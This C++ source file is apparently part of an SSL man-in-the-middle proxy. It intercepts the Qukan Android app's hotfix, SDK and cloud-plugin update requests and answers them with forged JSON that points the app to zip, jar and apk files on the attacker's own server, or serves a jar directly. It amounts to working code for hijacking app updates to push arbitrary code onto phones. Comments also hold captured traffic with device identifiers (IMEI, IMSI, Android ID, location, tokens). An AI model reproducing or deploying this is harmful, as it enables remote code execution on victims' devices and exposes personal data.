#include "qukan.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"

int gQukanFlag = 1;

int Qukan::isQukanHotfix(string url, string host) {
	if (host == "api.1sapp.com")
	{
		if (strstr(url.c_str(), "/app/getPatchV2?") )
		{
			gQukanFlag = 1;
			return TRUE;
		}else if (strstr(url.c_str(),"/app/getCloudPluginV3?") )
		{
			gQukanFlag = 4;
			return TRUE;
		}else if (strstr(url.c_str(), "/app/re/upgrade/patch/v2/get?") )
		{
			gQukanFlag = 1;
			return TRUE;
		}
	}else if (host == "update0.aiclk.com")
	{
		if (strstr(url.c_str(), "/nsdk/cgi/") )
		{
			gQukanFlag = 2;
			return TRUE;
		}
	}else if (host == "cdn.aiclicash.com")
	{
		if (strstr(url.c_str(),"/nsdk/aisdk_qtt.jar") )
		{
			gQukanFlag = 3;
			return TRUE;
		}
	}
	else if (host == "cdn.aiclk.com")
	{
		if (strstr(url.c_str(), "/nsdk/") && strstr(url.c_str(), "/aisdk_") && strstr(url.c_str(), ".jar"))
		{
			gQukanFlag = 3;
			return TRUE;
		}
	}

	return FALSE;
}

int Qukan::replyQukanHotfix(char*lpbuffer, int len, int buflimit, LPSSLPROXYPARAM pstSSLProxyParam) {

	int ret = 0;
	int respsize = 0;
	
	if (gQukanFlag == 1)
	{
		string ver = "9";	//1
		
		string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + pstSSLProxyParam->username;
		string zipfn1 = "qukan_hotfix.zip";
		//string zipfn2 = "qukan_hotfix_2.zip";
		//string zipfn3 = "qukanhotfix3.zip";

		char szfile1md5[256] = { 0 };
		unsigned char hex1md5[256] = { 0 };
		string filename1 = Public::getUserPluginPath(pstSSLProxyParam->username) + zipfn1;
		int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

// 		char szfile2md5[256] = { 0 };
// 		string filename2 = Public::getUserPluginPath(pstSSLProxyParam->username) + zipfn2;
// 		int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hex1md5, TRUE);


		//time_t must use I64u
		char * lpRespContentFormat =
		"{\"code\":0,\"message\":\"成功\",\"showErr\":0,\"currentTime\":%I64u,\"data\":{\"data\":["
		"{\"sid\":207,\"pkgId\":204,\"url\":\"http:\\/\\/%s\\/%s\",\"length\":%u,\"name\":\"search\",\"version\":\"9\",\"md5\":\"%s\"}"
		"]}}";

		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			time(0),
			strip.c_str(), zipfn1.c_str(), filesize1, szfile1md5
			//,strip.c_str(), zipfn2.c_str(), filesize2, szfile2md5
		);

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}else if (gQukanFlag == 2)
	{
		string strip = HttpUtils::getIPstr(gServerIP) + "/" + pstSSLProxyParam->username;
		string zipfn = "aisdk.jar";
		char * format = "{\"code\":0,\"message\":\"ok\",\"action\": 1,\"target_url\":\"http://%s/%s\"}";
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format, strip.c_str(), zipfn.c_str());

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}else if (gQukanFlag == 3)
	{
		//string strip = HttpUtils::getIPstr(gServerIP) + "/" + pstSSLProxyParam->username;
		string zipfn = "aisdk_qtt.jar";

		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/java-archive\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(pstSSLProxyParam->username, zipfn);
		int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
		return ret;

	}else if (gQukanFlag == 4)
	{
		//com.uqu.live.plugin
		//com.uqu.live.app.LiveApp
		//com.jifen.qukan.shm
		//com.jifen.qukan.alimama.app.AlimamaApplication
		string version = "9.8.9";
		string subversion = "9.9.34.000.0718.1137";

		string version2 = "9.9.01";
		string subversion2 = "9.9.34.000.0718.1137";

		time_t now = time(0);

		string fn = "qukan_cloud_plugin_uqulive.apk";
		char szfilemd5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		string filename = Public::getUserPluginPath(pstSSLProxyParam->username) + fn;
		int filesize = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, TRUE);

		string fn2 = "qukan_cloud_plugin_shm.apk";
		char szfile2md5[256] = { 0 };

		string filename2 = Public::getUserPluginPath(pstSSLProxyParam->username) + fn2;
		int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hexmd5, TRUE);

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + pstSSLProxyParam->username;

		char * format = "{\"code\":0,\"message\":\"成功\",\"showErr\":0,\"currentTime\":%I64d,\"data\":[{"
			"\"name\":\"uqulive\",\"version\":\"%s\",\"md5\":\"%s\","
			"\"url\":\"http:\\/\\/%s\\/%s\",\"length\":%u,"
			"\"apply_app_version\":[\"%s\"],\"load_type\":1},"
			"{\"name\":\"shm\",\"version\":\"%s\",\"md5\":\"%s\",\"url\":\"http:\\/\\/%s\\/%s\",\"length\":%u,"
			"\"apply_app_version\":[\"%s\"],\"load_type\":1}]}";
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format, 
			now,version.c_str(),szfilemd5,strip.c_str(),fn.c_str(),filesize,subversion.c_str(),
			version2.c_str(), szfile2md5, strip.c_str(), fn2.c_str(), filesize2, subversion2.c_str());

		respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return respsize;
	}

	return respsize;
}

/*
api.1sapp.com/app/re/upgrade/patch/v2/get?versionName=3.9.49.000.1030.1607&version=30949000&dtu=044&deviceCode=&ma=OPPO&os=23&apkIdentity=0F359BB7F4071FFD451F5E2E552993DA&time=1576118759791&tk=T6XGVdmzOOQmWKMxWy4VU3nxrXLY-Vk-&tuid=Q6n3YbDOR2iFiBluTFQIcQ&oaid=&sign=ec1324e43341827bb03e7bf004b43159
GET /app/re/upgrade/patch/v2/get?versionName=3.9.49.000.1030.1607&version=30949000&dtu=044&deviceCode=&ma=OPPO&os=23&apkIdentity=0F359BB7F4071FFD451F5E2E552993DA&time=1576118759791&tk=T6XGVdmzOOQmWKMxWy4VU3nxrXLY-Vk-&tuid=Q6n3YbDOR2iFiBluTFQIcQ&oaid=&sign=ec1324e43341827bb03e7bf004b43159 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: api.1sapp.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Thu, 12 Dec 2019 02:46:02 GMT
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: aliyungf_tc=AQAAACJI5xfOvQcArPTHcy4PCW09GHHG; Path=/; HttpOnly
Server: bjg-qtt-mainversion-platform-20
Vary: Accept-Encoding
X-Kong-Upstream-Latency: 11
Content-Encoding: gzip
X-Kong-Proxy-Latency: 4
Access-Control-Allow-Origin: *
Via: kong/1.2.1
Set-Cookie: qkV2=2aeaaba902eb7ee5fcfb0e4c93513330; expires=Fri, 11-Dec-2020 02:46:02 GMT; Max-Age=31536000; path=/

{"code":0,"message":"成功","showErr":0,"currentTime":1575860130,"data":{"data":[{"sid":221,"pkgId":218,"url":
"http:\/\/apk.1sapp.com\/qukan_hotfix_3.9.54.000.1204.1648_001_150.zip",
"length":1829,"name":"report","version":"1","md5":"ce5c0a3fbf2a784ef5eef78562d251fc"},
{"sid":222,"pkgId":219,"url":"http:\/\/apk.1sapp.com\/qukan_hotfix_3.9.54.000.1204.1648_002_216.zip",
"length":3528,"name":"TopicTrampoline","version":"1","md5":"7275387bd2287aa8deebc32c60abcc39"}]}}
*/

/*
GET /app/getPatchV2?versionName=3.9.6.000.0110.1453&version=30906000&dtu=044&deviceCode=A00000611E3E28&ma=OPPO&os=23&apkIdentity=B8BB295DBF175E35E005AE4336FD7876&time=1547288131379&tk=ACFDqfdhsM5HaIWIGW5MVAhxvjwsMX4AQys0NzUxNDk1MDg5NTIyNQ&sign=2bd2f32e56332a0185fbdd01a8ddce79 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: api.1sapp.com
Connection: Keep-Alive
Accept-Encoding: gzip

ssl server data:HTTP/1.1 200 OK
Date: Sat, 12 Jan 2019 10:15:32 GMT
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: aliyungf_tc=AQAAAP5y8UbiaQoA0WnpevitpqzKAjPl; Path=/; HttpOnly
Server: bjc-qtt-backend-api-870
Vary: Accept-Encoding
X-Kong-Upstream-Latency: 13
Content-Encoding: gzip
X-Kong-Proxy-Latency: 0
Access-Control-Allow-Origin: *
Via: kong/0.14.1
Set-Cookie: qkV2=7aa9bd757924587376490ee3d0b9ccf3; expires=Sun, 12-Jan-2020 10:15:32 GMT; Max-Age=31536000; path=/

{"code":0,"message":"成功","showErr":0,"currentTime":1547288132,"data":{"data":[{"sid":22,"pkgId":20,"url":"http:\/\/apk.1sapp.com\/qukan_hotfix_3.9.6.000.0110.1453_001_435.zip","length":2491,"name":"share","version":"1","md5":"ee4766492902cfd818d0eaacebe127a6"}]}}
*/


/*
update0.aiclk.com/nsdk/cgi/

POST /nsdk/cgi/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: update0.aiclk.com
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 204

{"current_md5":"","dsheight":1280,"dswidth":720,"brand":"OPPO","model":"OPPO A57","os_version":"6.0.1","package_name":"com.jifen.qukan","app_version":"3.9.47.000.1016.1656","androidid":"12dc3c0630e77825"}HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
Date: Wed, 23 Oct 2019 05:16:09 GMT
X-Kong-Upstream-Latency: 8
X-Kong-Proxy-Latency: 1
Via: kong/1.2.1

{"code":0,"message":"鎴愬姛","action":1,"target_url":"https://cdn.aiclk.com/nsdk/1.907/aisdk_603.jar"}

GET cdn.aiclk.com/nsdk/1.907/aisdk_603.jar HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: cdn.aiclk.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Wed, 23 Oct 2019 05:16:10 GMT
Content-Type: application/java-archive
Content-Length: 912963
Connection: keep-alive
Server: NWS_TCloud_S2
Cache-Control: max-age=600
Expires: Wed, 23 Oct 2019 05:26:09 GMT
Last-Modified: Mon, 21 Oct 2019 03:28:12 GMT
X-NWS-LOG-UUID: ae4a0142-204d-4517-b434-5d0611d64bc4
qtt_node_forwarded_for: 180.97.146.141
qtt_cdn_provider: tx
X-Cache-Lookup: Hit From Disktank3
X-Via: DIANXIN-JIANGSU_153(200:miss);DIANXIN-JIANGSU_141(200:hit)
Accept-Ranges: bytes
qtt_huiyuan: 0
X-Daa-Tunnel: hop_count=1
X-Cache-Lookup: Hit From Inner Cluster
*/


/*
https://cdn.aiclicash.com/nsdk/aisdk_qtt.jar

GET /nsdk/aisdk_qtt.jar HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: cdn.aiclicash.com
Connection: Keep-Alive
Accept-Encoding: gzip

cdn.aiclicash.com/nsdk/aisdk_qtt.jar
*/


/*
GET /app/getCloudPluginV3?dtu=044&tk=ACFDqfdhsM5HaIWIGW5MVAhxvjwsMX4AQys0NzUxNDk1MDg5NTIyNQ&lon=120.1704&sign=37a3dc10a9f3b4fcb33e0866bcfdcdef&time=1564126305394&token=&guid=14564bdc167775d19f53161b224.10296944&uuid=804cd8c8f9c547f298906e15026f4b71&tuid=Q6n3YbDOR2iFiBluTFQIcQ&imsiCode=460017155377271&os=23&ma=OPPO&env=qukan_prod&versionName=3.9.34.000.0718.1137&network=wifi&OSVersion=6.0.1&distinct_id=12dc3c0630e77825&version=30934000&device_code=864257034824830&traceId=5366dc10cac26a6f19c167a2ac893539&wxPathCode=068630ffd27aba7d149f44a82ffbe8bb&lat=30.18028&deviceCode=864257034824830 HTTP/1.1
User-Agent: qukan_android
Host: api.1sapp.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Fri, 26 Jul 2019 07:31:45 GMT
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: aliyungf_tc=AQAAAGAgBkDF7gcAE/kWJBPchl3wv3w5; Path=/; HttpOnly
Server: bjc-qtt-backend-api-431
Vary: Accept-Encoding
X-Qtt-Hitexpids: 1,6499,6861,10204,12300,14576,18998,19713,20874,21295,22738,23339,24166,25217,25434,25972,26482,27373,27783,28252,28558,28775,28876,28911,29114,29463,29480,29495,29742,29923,29981,30010,30079,30152,30158,30202,30204,30207,30247,30288,30582,30651,30659,30690,30722,30778,30822,30883,30893,30943,30993,31008,31037,31074,31075,31079,31109,31157,31158,31223,31299,31323,31350,31429,31457,31601,31612,31655,31691,31727,31763,31789
X-Qtt-Useexpids:
Content-Encoding: gzip
Access-Control-Allow-Origin: *
Set-Cookie: qkV2=133cf7a5566be7e4670725f1f97fb31a; expires=Sat, 25-Jul-2020 07:31:45 GMT; Max-Age=31536000; path=/
X-Qtt-Exptimestamp: 1564126305

{"code":0,"message":"成功","showErr":0,"currentTime":1564153003,"data":[{"name":"uqulive","version":"0.9.3","md5":"32715c9b8a9e49973331ca89032baf32","url":"http:\/\/apk.1sapp.com\/qukan_cloud_plugin_uqulive_0.9.3_001_957.apk","length":8192212,"apply_app_version":["3.9.35.000.0725.1023"],"load_type":1},{"name":"shm","version":"0.0.8","md5":"0352359266cf7a48726446af58e9af69","url":"http:\/\/apk.1sapp.com\/qukan_cloud_plugin_shm_0.0.8_001_803.apk","length":206690,"apply_app_version":["3.9.35.000.0725.1023"],"load_type":2}]}

{"code":0,"message":"成功","showErr":0,"currentTime":1564126305,"data":[{"name":"uqulive","version":"0.8.9","md5":"a3815fb588736c247a94958e9f817dac","url":"http:\/\/apk.1sapp.com\/qukan_cloud_plugin_uqulive_0.8.9_001_932.apk","length":7879858,"apply_app_version":["3.9.34.000.0718.1137"],"load_type":1},{"name":"uqulive","version":"0.9.01","md5":"362fb1ffaf80658cc075762c768e493f","url":"http:\/\/apk.1sapp.com\/qukan_cloud_plugin_uqulive_0.9.01_001_976.apk","length":8191925,"apply_app_version":["3.9.34.000.0718.1137"],"load_type":1}]}

HEAD /qukan_cloud_plugin_uqulive_0.9.01_001_976.apk HTTP/1.1
Range: bytes=0-
User-Agent: qukan_android;retrofit/2.4.0 okhttp/3.11.0;os/6.0.1 OPPO A57 OPPO;device/864257034824830;version/3.9.34.000.0718.1137;channel/044
Host: apk.1sapp.com
Connection: Keep-Alive

HTTP/1.1 206 Partial Content
Server: Tengine
Content-Type: application/vnd.android.package-archive
Content-Length: 8191925
Connection: keep-alive
Date: Mon, 22 Jul 2019 12:39:16 GMT
x-oss-request-id: 5D35AE74A645AE84280C811B
Accept-Ranges: bytes
ETag: "362FB1FFAF80658CC075762C768E493F"
Last-Modified: Mon, 22 Jul 2019 12:36:16 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 6391983812107426219
x-oss-storage-class: Standard
Content-MD5: Ni+x/6+AZYzAdXYsdo5JPw==
x-oss-server-time: 3
Ali-Swift-Global-Savetime: 1563799156
Via: cache2.l2nu20-3[0,206-0,H], cache29.l2nu20-3[1,0], vcache1.cn804[0,206-0,H], vcache20.cn804[0,0]
Age: 327111
X-Cache: HIT TCP_MEM_HIT dirn:6:452665409 mlen:0
X-Swift-SaveTime: Mon, 22 Jul 2019 12:39:16 GMT
X-Swift-CacheTime: 2592000
Content-Range: bytes 0-8191924/8191925
Timing-Allow-Origin: *
EagleId: 968a622815641262676441939e

GET /qukan_cloud_plugin_uqulive_0.9.01_001_976.apk HTTP/1.1
Range: bytes=0-2730640
User-Agent: qukan_android;retrofit/2.4.0 okhttp/3.11.0;os/6.0.1 OPPO A57 OPPO;device/864257034824830;version/3.9.34.000.0718.1137;channel/044
Host: apk.1sapp.com
Connection: Keep-Alive

HTTP/1.1 206 Partial Content
Server: Tengine
Content-Type: application/vnd.android.package-archive
Content-Length: 2730641
Connection: keep-alive
Date: Mon, 22 Jul 2019 12:39:16 GMT
x-oss-request-id: 5D35AE74A645AE84280C811B
Accept-Ranges: bytes
ETag: "362FB1FFAF80658CC075762C768E493F"
Last-Modified: Mon, 22 Jul 2019 12:36:16 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 6391983812107426219
x-oss-storage-class: Standard
Content-MD5: Ni+x/6+AZYzAdXYsdo5JPw==
x-oss-server-time: 3
Ali-Swift-Global-Savetime: 1563799156
Via: cache2.l2nu20-3[0,206-0,H], cache29.l2nu20-3[1,0], vcache1.cn804[0,206-0,H], vcache20.cn804[3,0]
Age: 327111
X-Cache: HIT TCP_MEM_HIT dirn:6:452665409 mlen:0
X-Swift-SaveTime: Mon, 22 Jul 2019 12:39:16 GMT
X-Swift-CacheTime: 2592000
Content-Range: bytes 0-2730640/8191925
Timing-Allow-Origin: *
EagleId: 968a622815641262678882226e
*/